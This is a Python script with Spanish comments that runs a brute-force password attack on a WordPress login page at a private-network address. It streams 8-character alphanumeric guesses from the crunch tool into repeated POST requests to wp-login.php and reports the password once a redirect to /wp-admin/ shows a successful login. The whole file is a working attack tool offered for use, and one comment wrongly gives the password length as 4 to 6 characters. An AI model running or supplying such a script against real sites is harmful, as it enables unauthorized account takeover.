
import requests
import subprocess
import time

# CONFIGURACIÓN
host = "192.168.0.137"
url_login = f"http://{host}/wp-login.php"
usuario = "wordpress-user"

# COMANDO crunch (alfanumérico, 4 a 6 caracteres)
crunch_cmd = ["crunch", "8", "8", "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"]

# CABECERAS
headers = {
    "Host": host,
    "Origin": f"http://{host}",
    "Content-Type": "application/x-www-form-urlencoded",
    "Upgrade-Insecure-Requests": "1",
    "User-Agent": "Mozilla/5.0",
    "Referer": f"http://{host}/wp-login.php",
    "Accept": "text/html",
}

cookies = {
    "wordpress_test_cookie": "WP Cookie check"
}

print("🚀 Iniciando ataque de fuerza bruta con crunch (sin guardar diccionario)...")

# Lanzar crunch como proceso
proc = subprocess.Popen(crunch_cmd, stdout=subprocess.PIPE, text=True)

start = time.time()
count = 0

for pwd in proc.stdout:
    pwd = pwd.strip()
    count += 1

    data = {
        "log": usuario,
        "pwd": pwd,
        "wp-submit": "Log In",
        "redirect_to": f"http://{host}/wp-admin/",
        "testcookie": "1"
    }

    resp = requests.post(url_login, data=data, headers=headers, cookies=cookies, allow_redirects=False)

    if resp.status_code == 302 and "/wp-admin/" in resp.headers.get("Location", ""):
        print(f"\n✅ Contraseña encontrada: {pwd}")
        proc.kill()
        break
    elif count % 100 == 0:
        elapsed = time.time() - start
        print(f"[{count}] Última probada: {pwd} — Tiempo: {elapsed:.1f}s")

else:
    print("\n🚫 No se encontró contraseña válida.")

end = time.time()
print(f"\n⏱️ Tiempo total: {end - start:.2f}s")

